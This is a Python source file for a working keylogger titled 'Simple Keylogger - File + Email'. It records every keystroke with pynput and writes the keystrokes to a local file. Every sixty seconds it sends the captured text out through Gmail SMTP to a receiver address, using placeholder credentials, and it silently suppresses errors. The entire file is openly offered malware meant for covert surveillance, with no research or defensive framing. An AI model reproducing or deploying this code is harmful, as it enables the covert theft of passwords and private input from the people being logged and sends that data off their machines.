"""
Simple Keylogger - File + Email
"""

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import time
from pynput.keyboard import Key, Listener

EMAIL_TO = "receiver@gmail.com"
EMAIL_FROM = "yourgmail@gmail.com"
EMAIL_PASS = "abcd efgh ijkl mnop"
LOG_FILE = "keylog.txt"

class Keylogger:
    def __init__(self):
        self.log = ""
        
    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.log += key.char
            elif key == Key.space: self.log += " "
            elif key == Key.enter: self.log += "\n"
            else: self.log += f"[{key.name}]"
        except: pass

    def save_file(self):
        if self.log:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(self.log + "\n" + "="*30 + f" {time.strftime('%H:%M:%S')} " + "="*30 + "\n")

    def send_email(self):
        if self.log:
            try:
                msg = MIMEMultipart()
                msg['From'] = EMAIL_FROM
                msg['To'] = EMAIL_TO
                msg['Subject'] = f"Keylog {time.strftime('%Y-%m-%d %H:%M')}"

                msg.attach(MIMEText(self.log, 'plain'))

                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(EMAIL_FROM, EMAIL_PASS)
                server.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
                server.quit()
            except: pass

    def report(self):
        self.save_file()
        self.send_email()
        self.log = ""

    def run(self):
        with Listener(on_press=self.on_press) as listener:
            while True:
                time.sleep(60)
                self.report()

if __name__ == "__main__":
    kl = Keylogger()
    kl.run()
